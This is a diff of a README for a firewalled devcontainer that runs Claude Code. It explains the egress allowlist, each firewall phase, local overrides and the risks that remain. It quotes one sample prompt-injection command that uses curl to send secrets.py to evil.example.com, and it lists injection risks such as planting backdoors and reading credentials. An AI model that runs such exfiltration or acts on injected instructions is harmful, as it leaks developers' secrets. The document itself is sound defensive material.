@@ -230,45 +230,51 @@ The container can ONLY reach:
 | `statsig.com` | Claude Code telemetry (optional) |
 | `registry.npmjs.org` | Node package registry (optional) |
 | `shorelineiot.atlassian.net` | Atlassian / Jira access |
+| `github.com` | For claude plugin marketplace (optional) |
 | `$EC2_HOST` | SSH tunnel to database |
+| AWS service CIDRs (us-east-1) | SSM, S3, EC2, STS API endpoints |
 | Docker host network | Port forwarding (OAuth, app ports) |
 | localhost | LSP servers, local tools |
 
 All other outbound traffic is blocked and rejected. A prompt injection that tries `curl https://evil.example.com/exfil -d "$(cat /workspace/secrets.py)"` will fail immediately with a connection rejected error.
 
-### What this does NOT protect against
+---
 
-No security setup is perfect. Be aware of these remaining risks:
+## How the Firewall Works
 
-**Source code modification.** A prompt injection can still modify your code — inserting backdoors, weakening security checks, or introducing subtle bugs. The firewall prevents exfiltration but not tampering. Always review changes before committing (which you do from the host).
+The firewall script (`init-firewall.sh`) runs every time the container starts via `postStartCommand`. It uses `iptables` and `ipset` to create a default-deny egress policy — all outbound traffic is blocked unless it's going to an explicitly whitelisted destination. Here's what happens step by step.
 
-**Claude auth token.** The `~/.claude` mount means a prompt injection could read your Claude Code auth token. The blast radius is limited to someone making API calls as you to Anthropic, which is much smaller than SSH or AWS credential theft.
+### Phase 1: Preserve Docker internals
 
-**EC2 SSH key.** The mounted EC2 key is read-only and the firewall limits where SSH connections can go (only `$EC2_HOST`). A prompt injection cannot exfiltrate the key to an external server, but it could theoretically use it to SSH into the bastion host.
+Docker uses an embedded DNS server at `127.0.0.11` for container name resolution. The script saves any existing NAT rules related to this address before flushing all firewall rules, then restores them afterward. Without this, DNS resolution inside the container would break.
 
-**Short-lived AWS credentials in environment.** A prompt injection could read the STS token from environment variables. However, the egress firewall blocks exfiltration, and the token expires within hours. This is a significant improvement over mounting long-lived `~/.aws` credentials.
+### Phase 2: Allow foundational traffic
 
-**Container escape.** This setup assumes Docker's container isolation holds. Container escapes are rare but not impossible. The `NET_ADMIN` and `NET_RAW` capabilities required for the firewall are additional kernel capabilities granted to the container, though they are used here to restrict rather than expand access.
+Before applying any restrictions, the script permits traffic that everything else depends on: outbound DNS (UDP port 53) so domain names can be resolved, localhost/loopback so LSP servers and local tools work, and the Docker host network (auto-detected via the default gateway) so port forwarding works for things like Claude Code's OAuth browser flow and your application ports.
 
-**DNS-based firewall limitations.** The firewall resolves domain names to IP addresses at container start time. If a whitelisted service (like `api.anthropic.com`) rotates its IPs during a long session, connections may break until the container is restarted. In practice this rarely matters for typical dev sessions.
+### Phase 3: Resolve and whitelist domains
 
-**No internet research.** Because the firewall blocks general internet access, Claude Code cannot browse documentation, search the web, or fetch resources from arbitrary URLs. It operates using only its training knowledge and the contents of your project. If you need Claude to reference external information, look it up on your host and paste the relevant content into your prompt.
+The script maintains an `ALLOWED_DOMAINS` array of hostnames that the container is permitted to reach. For each domain, it runs `dig` to resolve the current A records and adds the resulting IP addresses to an `ipset` hash called `allowed-domains`. If a domain is already a raw IP address, it's added directly.
 
-### The `--cap-add` flags explained
+This is where the DNS-based limitation comes in: the IPs are resolved once at container start. If a service like `api.anthropic.com` rotates to new IPs during a long session, outbound connections to that service may fail until you restart the container. In practice this is rare for typical dev sessions lasting a few hours.
 
-The `devcontainer.json` includes `--cap-add=NET_ADMIN` and `--cap-add=NET_RAW`. These Docker capabilities allow the container to configure its own network — specifically, to run `iptables` and `ipset`. Without them, the firewall script would fail with "permission denied."
+### Phase 4: Whitelist AWS service CIDRs
 
-This might seem counterintuitive: you're granting extra capabilities to make the container *more* restrictive. The key distinction is that these capabilities allow the container to restrict its own outbound traffic. They do not grant the container any additional access to the host system or host network.
+AWS services (SSM, S3, EC2, STS) rotate their IP addresses frequently and unpredictably — far more than a typical web service. Resolving `ssm.us-east-1.amazonaws.com` once at startup would break within minutes as AWS shifts traffic across its infrastructure.
 
-### The sudoers configuration explained
+To handle this, the script fetches the official AWS IP ranges from `https://ip-ranges.amazonaws.com/ip-ranges.json` (a well-known, stable endpoint maintained by AWS). It then extracts the CIDR blocks for the specific services and region your container needs — currently `SSM`, `S3`, `EC2`, and `AMAZON` in `us-east-1` — and adds all of them to the `ipset` whitelist.
 
-The Dockerfile grants the non-root `dev` user passwordless sudo access to exactly one command: `/usr/local/bin/init-firewall.sh`. This is configured via:
+This adds a few hundred CIDRs covering the full range of IPs those AWS services might use in your region. It's broader than the per-domain approach used for other services, but it's still scoped: only the listed services in the listed region are whitelisted, and these are AWS infrastructure endpoints, not arbitrary internet destinations. A prompt injection cannot use `ssm.us-east-1.amazonaws.com` as an exfiltration channel because it requires valid AWS credentials to do anything with those endpoints.
 
-```
-dev ALL=(root) NOPASSWD: /usr/local/bin/init-firewall.sh
-```
+The `AMAZON` service prefix is included because it's a superset that covers shared AWS infrastructure (load balancers, edge nodes) that other services depend on. Without it, some legitimate AWS API calls may fail because the actual IP the request hits isn't tagged under the specific service prefix.
 
-This means the `dev` user cannot run arbitrary commands as root — only the firewall initialization script. The firewall must run as root because `iptables` requires it, but all other operations (Claude Code, Neovim, Python, your code) run as the unprivileged `dev` user.
+### Phase 5: Lock down and verify
+
+After building the whitelist, the script sets the default `iptables` policies to `DROP` for all chains (INPUT, FORWARD, OUTPUT). It then adds rules to allow established/related connections (so responses to approved outbound requests can come back in) and to allow outbound traffic only to IPs in the `allowed-domains` ipset.
+
+Everything else hits a `REJECT` rule (not `DROP`) with `icmp-admin-prohibited`. The distinction matters: `REJECT` sends an immediate error response back to the calling process, so tools like `curl` fail fast with a clear error. `DROP` would silently swallow packets, causing tools to hang for their full timeout duration before failing — which makes debugging harder and slows down prompt injection attempts that are probing for connectivity.
+
+Finally, the script runs verification checks to confirm that the firewall is working correctly: it confirms that `example.com` and `webhook.site` (common exfiltration test targets) are blocked, that `api.anthropic.com` is reachable, and that the EC2 bastion host (if configured) is reachable on port 22. If any critical check fails, the script exits with a non-zero code, which causes `postStartCommand` to fail and prevents the container from being used in an insecure state.
 
 ### Adding domains to the whitelist
 
@@ -288,6 +294,85 @@ ALLOWED_DOMAINS=(
 ```
 
 Then restart the container so the firewall re-initializes with the new rules. Every domain you add is a potential vector for prompt injection content, so add only what you genuinely need.
+
+#### Overriding the firewall locally
+
+If you need to temporarily allow additional domains without modifying the base image or the committed firewall script, you can place a local copy of `init-firewall.sh` in your service's `.devcontainer/` directory. The `post-start.sh` script checks for a local copy first — if one exists, it copies it into the base image's location before running it. If no local copy exists, the base image's version runs as usual.
+
+```bash
+# Copy the firewall script from the base repo as a starting point
+# (or extract it from the running container)
+dcexec cat /usr/local/bin/init-firewall.sh > .devcontainer/init-firewall.sh
+
+# Edit it — add your domains to the ALLOWED_DOMAINS array
+vim .devcontainer/init-firewall.sh
+
+# Restart the container to pick up the changes
+dcup
+```
+
+To revert to the standard firewall, just delete the local copy and restart:
+
+```bash
+rm .devcontainer/init-firewall.sh
+dcup
+```
+
+If you don't want personal firewall overrides committed to the service repo, add it to your `.gitignore`:
+
+```bash
+echo '.devcontainer/init-firewall.sh' >> .gitignore
+```
+
+
+### Changing the AWS region or services
+
+If your infrastructure is in a different region or you need additional AWS services, edit the variables near the AWS CIDR section of `init-firewall.sh`:
+
+```bash
+AWS_REGION="us-east-1"
+AWS_SERVICES=("SSM" "S3" "EC2" "AMAZON")
+```
+
+Change `AWS_REGION` to match your infrastructure. Add service prefixes to `AWS_SERVICES` if you need access to additional AWS services (the valid prefixes are listed in the [AWS IP ranges documentation](https://docs.aws.amazon.com/general/latest/gr/aws-ip-ranges.html)). Keep `AMAZON` in the list — removing it will break connectivity to shared AWS infrastructure that other services depend on.
+
+---
+
+## What This Does NOT Protect Against
+
+No security setup is perfect. Be aware of these remaining risks:
+
+**Source code modification.** A prompt injection can still modify your code — inserting backdoors, weakening security checks, or introducing subtle bugs. The firewall prevents exfiltration but not tampering. Always review changes before committing (which you do from the host).
+
+**Claude auth token.** The `~/.claude` mount means a prompt injection could read your Claude Code auth token. The blast radius is limited to someone making API calls as you to Anthropic, which is much smaller than SSH or AWS credential theft.
+
+**EC2 SSH key.** The mounted EC2 key is read-only and the firewall limits where SSH connections can go (only `$EC2_HOST`). A prompt injection cannot exfiltrate the key to an external server, but it could theoretically use it to SSH into the bastion host.
+
+**Short-lived AWS credentials in environment.** A prompt injection could read the STS token from environment variables. However, the egress firewall blocks exfiltration, and the token expires within hours. This is a significant improvement over mounting long-lived `~/.aws` credentials.
+
+**Container escape.** This setup assumes Docker's container isolation holds. Container escapes are rare but not impossible. The `NET_ADMIN` and `NET_RAW` capabilities required for the firewall are additional kernel capabilities granted to the container, though they are used here to restrict rather than expand access.
+
+**DNS-based firewall limitations.** The firewall resolves domain names to IP addresses at container start time. If a whitelisted service (like `api.anthropic.com`) rotates its IPs during a long session, connections may break until the container is restarted. In practice this rarely matters for typical dev sessions. AWS services are handled differently using CIDR ranges (see Phase 4 above), so they are not affected by this limitation.
+
+**No internet research.** Because the firewall blocks general internet access, Claude Code cannot browse documentation, search the web, or fetch resources from arbitrary URLs. It operates using only its training knowledge and the contents of your project. If you need Claude to reference external information, look it up on your host and paste the relevant content into your prompt.
+
+---
+
+## The `--cap-add` Flags Explained
+
+The `devcontainer.json` includes `--cap-add=NET_ADMIN` and `--cap-add=NET_RAW`. These Docker capabilities allow the container to configure its own network — specifically, to run `iptables` and `ipset`. Without them, the firewall script would fail with "permission denied."
+
+This might seem counterintuitive: you're granting extra capabilities to make the container *more* restrictive. The key distinction is that these capabilities allow the container to restrict its own outbound traffic. They do not grant the container any additional access to the host system or host network.
+
+## The Sudoers Configuration Explained
+
+The Dockerfile grants the non-root `dev` user passwordless sudo access to exactly one command: `/usr/local/bin/init-firewall.sh`. This is configured via:
+
+```
+dev ALL=(root) NOPASSWD: /usr/local/bin/init-firewall.sh
+```
+
+This means the `dev` user cannot run arbitrary commands as root — only the firewall initialization script. The firewall must run as root because `iptables` requires it, but all other operations (Claude Code, Neovim, Python, your code) run as the unprivileged `dev` user.
 
 ---
 
